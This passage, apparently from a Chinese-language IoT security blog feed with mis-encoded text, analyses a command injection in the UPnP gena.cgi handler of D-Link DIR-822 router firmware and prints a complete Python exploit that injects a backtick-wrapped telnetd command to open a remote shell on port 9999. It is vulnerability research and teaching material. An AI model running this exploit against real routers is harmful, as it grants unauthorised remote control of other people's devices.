è®¾å¤‡çš„æ–¹æ³•äº†ï¼Œåœ¨è¿™ä¸¤ç§åè®®å‡ºç°ä¹‹å‰ï¼Œå¦‚æœæˆ‘ä»¬æ–°æ·»åŠ äº†ç¡¬ä»¶ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¸ºæ–°åŠ çš„ç¡¬ä»¶è®¾ç½®ç»ˆç«¯å’ŒI&#x2F;Oç«¯å£ï¼Œæˆ‘ä»¬æ‰€è¯´çš„æ‰‹å·¥è·³çº¿ï¼Œå°±æ˜¯æˆ‘ä»¬æ–°åŠ ç¡¬ä»¶ä¹‹åå°±è¦åœ¨ç›¸åº”çš„é’ˆè„šä¸Šç”¨å°è·³çº¿æ’ä¸€ä¸‹ï¼Œè¿™å¯¹ç”¨æˆ·çš„è¦æ±‚ååˆ†çš„é«˜ï¼Œæ•ˆç‡ä¹Ÿååˆ†ä½ä¸‹ã€‚</p><p>å…³äº<strong>UPnP</strong>è¿™é‡Œå°±ä¸è¯¦è¿°å•¦ï¼Œä¸‹é¢æˆ‘ä»¬å°±å¼€å§‹æ­£å¼çš„åˆ†æ</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>é¦–å…ˆæˆ‘ä»¬å°†å›ºä»¶ä¸‹è½½ä¸‹æ¥ï¼š<a href="https://github.com/Loora1N/IOT-Frimware/tree/main/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6/DIR822A1">DIR822A1_FW103WWb03_(github.com)</a></p><p>åˆ©ç”¨binwalkå°†<code>.bin</code>æ–‡ä»¶åˆ†è§£ï¼Œä»¥è·å–å…¶ç›®å½•ç»“æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -eM DIR822A1_FW103WWb03.bin<br></code></pre></td></tr></table></figure><p>è¿›å…¥rootæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç›®å½•ç»“æ„</p><p><img src="/img/article/iot-3/image-20220916150517246.png" alt="image-20220916150517246"></p><p>è¿›å…¥<code>htdocs</code>ç›®å½•ï¼Œæ‰¾åˆ°<code>cgibin</code>ï¼Œåˆ©ç”¨IDA PROå¯¹å…¶è¿›è¡Œé€†å‘åˆ†æ, å¹¶æœç´¢<code>gena.cgi</code></p><p><img src="/img/article/iot-3/image-20220916152135019.png" alt="image-20220916152135019"></p><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†<code>genacgi_main()</code>å‡½æ•°ï¼Œè·Ÿè¿›</p><p><img src="/img/article/iot-3/image-20220916152713992.png" alt="image-20220916152713992"></p><p>å¯ä»¥å‘ç°ï¼Œå¦‚æœè¯·æ±‚æ–¹å¼æ˜¯<code>SUBSCRIBE</code>ï¼Œä¼šè¿›å…¥<code>sub_40FCE0</code>å‡½æ•°ï¼Œè·Ÿè¿›</p><p><img src="/img/article/iot-3/image-20220916153633146.png" alt="image-20220916153633146"></p><p>å‘ç°è°ƒç”¨<code>xmldbc_ephp</code>å‡½æ•°</p><p><img src="/img/article/iot-3/image-20220916154509242.png" alt="image-20220916154509242"></p><p>å…¶ä¸­a3æ˜¯ä¼ å…¥çš„æŠ¥æ–‡ï¼Œç»§ç»­ä¸æ–­è·Ÿè¿›ï¼Œæœ€åæˆ‘ä»¬åœ¨<code>sub_41484C</code>ä¸­ï¼Œçœ‹åˆ°æŠ¥æ–‡è¢«å‘é€ï¼Œè¿™é‡Œçš„<code>a2</code>ä¾¿æ˜¯æŠ¥æ–‡</p><p><img src="/img/article/iot-3/image-20220916155952769.png" alt="image-20220916155952769"></p><p>ç”±å‰é¢çš„æŠ¥æ–‡å†…å®¹å¯çŸ¥ï¼Œå…¶è¢«ä¼ å…¥äº†<code>run.NOTIFY.php</code>ã€‚</p><p><img src="/img/article/iot-3/image-20220916160304794.png" alt="image-20220916160304794"></p><p>åœ¨æ–‡ä»¶ç»“æ„å†…æœç´¢<code>run.NOTIFY.php</code>ï¼Œå¹¶æŸ¥çœ‹æ–‡ä»¶å†…å®¹ã€‚</p><p><img src="/img/article/iot-3/image-20220916160413527.png" alt="image-20220916160413527"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/phplib/upnp/xnode.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/upnpinc/gvar.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/upnpinc/gena.php&quot;</span>;<br><br><span class="hljs-variable">$gena_path</span> = <span class="hljs-title function_ invoke__">XNODE_getpathbytarget</span>(<span class="hljs-variable">$G_GENA_NODEBASE</span>, <span class="hljs-string">&quot;inf&quot;</span>, <span class="hljs-string">&quot;uid&quot;</span>, <span class="hljs-variable">$INF_UID</span>, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$gena_path</span> = <span class="hljs-variable">$gena_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$SERVICE</span>;<br><span class="hljs-title function_ invoke__">GENA_subscribe_cleanup</span>(<span class="hljs-variable">$gena_path</span>);<br><br><span class="hljs-comment">/* IGD services */</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;L3Forwarding1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.Layer3Forwarding.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;OSInfo1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.OSInfo.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANCommonIFC1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANCommonInterfaceConfig.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANEthLinkC1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANEthernetLinkConfig.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANIPConn1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANIPConnection.1.php&quot;</span>;<br><span class="hljs-comment">/* WFA services */</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WFAWLANConfig1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WFAWLANConfig.1.php&quot;</span>;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$METHOD</span> == <span class="hljs-string">&quot;SUBSCRIBE&quot;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$SID</span> == <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-title function_ invoke__">GENA_subscribe_new</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$HOST</span>, <span class="hljs-variable">$REMOTE</span>, <span class="hljs-variable">$URI</span>, <span class="hljs-variable">$TIMEOUT</span>, <span class="hljs-variable">$SHELL_FILE</span>, <span class="hljs-string">&quot;/htdocs/upnp/&quot;</span>.<span class="hljs-variable">$php</span>, <span class="hljs-variable">$INF_UID</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-title function_ invoke__">GENA_subscribe_sid</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$SID</span>,  <span class="hljs-variable">$TIMEOUT</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$METHOD</span> == <span class="hljs-string">&quot;UNSUBSCRIBE&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">GENA_unsubscribe</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$SID</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å½“æ–¹æ³•ä¸º<strong>SUBSCRIBE</strong>æ—¶ä¼šè°ƒç”¨<code>GENA_subscribe_new</code>ï¼Œåˆ©ç”¨<code>vscode</code>æˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥çœ‹<code>GENA_subscribe_new</code>å‡½æ•°å®šä¹‰,å¹¶äº†è§£å…¶å®šä¹‰åœ¨<code>gena.php</code>å†…</p><p><img src="/img/article/iot-3/image-20220916161121953.png" alt="image-20220916161121953"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GENA_subscribe_new</span>(<span class="hljs-params"><span class="hljs-variable">$node_base</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$remote</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$timeout</span>, <span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-title function_ invoke__">anchor</span>(<span class="hljs-variable">$node_base</span>);<br><span class="hljs-variable">$count</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;subscription#&quot;</span>);<br><span class="hljs-variable">$found</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* find subscription index &amp; uuid */</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-string">&quot;subscription&quot;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;host&quot;</span>)==<span class="hljs-variable">$host</span> &amp;&amp; <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;uri&quot;</span>)==<span class="hljs-variable">$uri</span>)&#123;<span class="hljs-variable">$found</span> = <span class="hljs-variable">$InDeX</span>; <span class="hljs-keyword">break</span>;&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$found</span> == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-variable">$index</span> = <span class="hljs-variable">$count</span> + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$new_uuid</span> = <span class="hljs-string">&quot;uuid:&quot;</span>.<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/genuuid&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$index</span> = <span class="hljs-variable">$found</span>;<br><span class="hljs-variable">$new_uuid</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uuid&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* get timeout */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$timeout</span>==<span class="hljs-number">0</span> || <span class="hljs-variable">$timeout</span>==<span class="hljs-string">&quot;&quot;</span>) &#123;<span class="hljs-variable">$timeout</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$new_timeout</span> = <span class="hljs-number">0</span>;&#125;<br><span class="hljs-keyword">else</span> &#123;<span class="hljs-variable">$new_timeout</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/device/uptime&quot;</span>) + <span class="hljs-variable">$timeout</span>;&#125;<br><span class="hljs-comment">/* set to nodes */</span><br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/remote&quot;</span>,<span class="hljs-variable">$remote</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uuid&quot;</span>,<span class="hljs-variable">$new_uuid</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/host&quot;</span>,<span class="hljs-variable">$host</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uri&quot;</span>,<span class="hljs-variable">$uri</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/timeout&quot;</span>,<span class="hljs-variable">$new_timeout</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/seq&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br><span class="hljs-title function_ invoke__">GENA_subscribe_http_resp</span>(<span class="hljs-variable">$new_uuid</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-title function_ invoke__">GENA_notify_init</span>(<span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$new_uuid</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æŸ¥çœ‹è°ƒç”¨äº†<code>shell_file</code>çš„å‡½æ•°<code>GENA_notify_init</code>ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GENA_notify_init</span>(<span class="hljs-params"><span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$sid</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-variable">$inf_path</span> = <span class="hljs-title function_ invoke__">XNODE_getpathbytarget</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;inf&quot;</span>, <span class="hljs-string">&quot;uid&quot;</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$inf_path</span>==<span class="hljs-string">&quot;&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">TRACE_debug</span>(<span class="hljs-string">&quot;can&#x27;t find inf_path by <span class="hljs-subst">$inf_uid</span>=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<span class="hljs-string">&quot;!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$phyinf</span> = <span class="hljs-title function_ invoke__">PHYINF_getifname</span>(<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$inf_path</span>.<span class="hljs-string">&quot;/phyinf&quot;</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$phyinf</span> == <span class="hljs-string">&quot;&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">TRACE_debug</span>(<span class="hljs-string">&quot;can&#x27;t get phyinf by <span class="hljs-subst">$inf_uid</span>=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<span class="hljs-string">&quot;!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$upnpmsg</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/upnpmsg&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$upnpmsg</span> == <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-variable">$upnpmsg</span> = <span class="hljs-string">&quot;/dev/null&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(w, <span class="hljs-variable">$shell_file</span>,<br><span class="hljs-string">&quot;#!/bin/sh\n&quot;</span>.<br><span class="hljs-string">&#x27;echo &quot;[$0] ...&quot; &gt; &#x27;</span>.<span class="hljs-variable">$upnpmsg</span>.<span class="hljs-string">&quot;\n&quot;</span>.<br><span class="hljs-string">&quot;xmldbc -P &quot;</span>.<span class="hljs-variable">$target_php</span>.<br><span class="hljs-string">&quot; -V INF_UID=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<br><span class="hljs-string">&quot; -V HDR_URL=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$uri</span>).<br><span class="hljs-string">&quot; -V HDR_HOST=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$host</span>).<br><span class="hljs-string">&quot; -V HDR_SID=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$sid</span>).<br><span class="hljs-string">&quot; -V HDR_SEQ=0&quot;</span>.<br><span class="hljs-string">&quot; | httpc -i &quot;</span>.<span class="hljs-variable">$phyinf</span>.<span class="hljs-string">&quot; -d &quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$host</span>).<span class="hljs-string">&quot; -p TCP &gt; &quot;</span>.<span class="hljs-variable">$upnpmsg</span>.<span class="hljs-string">&quot;\n&quot;</span><br>);<br><span class="hljs-title function_ invoke__">fwrite</span>(a, <span class="hljs-variable">$shell_file</span>, <span class="hljs-string">&quot;rm -f &quot;</span>.<span class="hljs-variable">$shell_file</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å‡½æ•°<code>GENA_notify_init</code>ä¸­ï¼Œä¼šä¸¤æ¬¡è°ƒç”¨<code>fwrite</code>å†™å…¥ä¸€ä¸ªshellè„šæœ¬ã€‚ç”±ä¹‹å‰çš„æŠ¥æ–‡å¯çŸ¥<code>$shell_file</code>æ˜¯é€šè¿‡<code>.sh</code>å½¢å¼ä¼ å…¥ã€‚ç¬¬ä¸€æ¬¡è°ƒç”¨<code>fwrite</code>ï¼Œåˆ›å»º.shæ–‡ä»¶ï¼›è€Œåœ¨ç¬¬äºŒæ¬¡è°ƒç”¨ä¸­ï¼Œåˆ©ç”¨<code>fwrite</code>å‘.shæ–‡ä»¶ä¸­å†™å…¥<code>&quot;rm -f &quot;.$shell_file.&quot;\n&quot;</code>çš„åˆ é™¤å‘½ä»¤ã€‚</p><blockquote><p>è¿™é‡Œéœ€è¦è®²åˆ°ä¸€ä¸ªæœºåˆ¶ï¼Œshellå‘½ä»¤ä¸­ä¼šå°†&#96;&#96;åŒ…è£¹çš„å†…å®¹ä½œä¸ºå˜é‡ï¼Œå³ä¼šå…ˆæ‰§è¡Œå…¶ä¸­ä¸­çš„å†…å®¹ </p></blockquote><p><img src="/img/article/iot-3/image-20220916165317731.png" alt="image-20220916165317731"></p><p>é‚£ä¹ˆåªéœ€è¦æ’å…¥ä¸€ä¸ªåå¼•å·åŒ…è£¹çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå°†å…¶æ³¨å…¥åˆ°<strong>shell</strong>è„šæœ¬ä¸­ï¼Œå½“è„šæœ¬æ‰§è¡Œ<code>rm</code>å‘½ä»¤æ—¶é‡åˆ°åå¼•å·å°†å¤±è´¥ï¼Œç»§ç»­æ‰§è¡Œå¼•å·é‡Œé¢çš„ç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œè¾¾åˆ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´çš„è§¦å‘ã€‚å› æ­¤ï¼Œæ§åˆ¶å¥½<code>&quot;/gena.cgi?service=shell_file&quot;</code>ä¸­<strong>shell_file</strong>çš„å†…å®¹ä¸ºåå¼•å·åŒ…è£¹çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå°±å¯ä»¥è§¦å‘æ¼æ´ã€‚</p><h2 id="ç¯å¢ƒæ¨¡æ‹Ÿ"><a href="#ç¯å¢ƒæ¨¡æ‹Ÿ" class="headerlink" title="ç¯å¢ƒæ¨¡æ‹Ÿ"></a>ç¯å¢ƒæ¨¡æ‹Ÿ</h2><blockquote><p>ç¯å¢ƒæ­å»ºæ–¹æ³•å¯è§ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://loora1n.github.io/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">ã€IOT å­¦ä¹ äºŒã€‘å›ºä»¶åˆ†æä¸æ¼æ´åˆ©ç”¨ - é·ºé›¨ã®Blog (loora1n.github.io)</a></p></blockquote><p>é¦–å…ˆåˆ©ç”¨<strong>fat</strong>å®Œæˆå›ºä»¶ä»¿çœŸ</p><p><img src="/img/article/iot-3/image-20220916163243521.png" alt="image-20220916163243521"></p><p>é€šè¿‡<code>nmap</code>å‘½ä»¤æˆ‘ä»¬å¯ä»¥ç¡®å®šï¼Œå›ºä»¶ç¯å¢ƒæ˜¯å¦ä»¿çœŸæˆåŠŸã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå‡ ä¸ªç«¯å£å·²ç»æ‰“å¼€</p><p><img src="/img/article/iot-3/image-20220916163335524.png" alt="image-20220916163335524"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">httpSUB</span>(<span class="hljs-params">server, port, shell_file</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class="hljs-built_in">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class="hljs-string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="hljs-built_in">str</span>(shell_file) + <span class="hljs-string">&quot; HTTP/1.0\n&quot;</span><br>    request += <span class="hljs-string">&quot;Host: &quot;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;\n&quot;</span><br>    request += <span class="hljs-string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span><br>    request += <span class="hljs-string">&quot;NT: upnp:event\n&quot;</span><br>    request += <span class="hljs-string">&quot;Timeout: Second-1800\n&quot;</span><br>    request += <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span><br>    request += <span class="hljs-string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span><br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class="hljs-number">4096</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    os.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-string">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class="hljs-string">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class="hljs-number">49152</span><br>httpSUB(serverInput, portInput, <span class="hljs-string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="EXPè®²è§£"><a href="#EXPè®²è§£" class="headerlink" title="EXPè®²è§£"></a>EXPè®²è§£</h3><p>æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œå…¶å›ºä»¶å¯åŠ¨äº†telnetæœåŠ¡ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå¼•å· ,å°†<code>telnet -p 9999 &amp;</code> åŒ…è£¹ï¼Œå¹¶ä¼ å…¥å˜é‡$shell_fileè®©å…¶å¼€æ”¾9999ç«¯å£ï¼Œéšåæœ¬æœºè¿æ¥å³å¯ã€‚</p><p>è¿è¡Œè„šæœ¬åï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‹¿åˆ°<code>shell</code>,åŒæ—¶ç”¨<code>nmap</code>æ‰«æipå¯ä»¥çœ‹åˆ°9999ç«¯å£ç¡®å®å·²ç»å¼€æ”¾äº†ã€‚</p><p><img src="/img/article/iot-3/image-20220916170501767.png" alt="image-20220916170501767"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOT å­¦ä¹ äºŒã€‘å›ºä»¶åˆ†æä¸æ¼æ´åˆ©ç”¨</title>
    <link href="/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
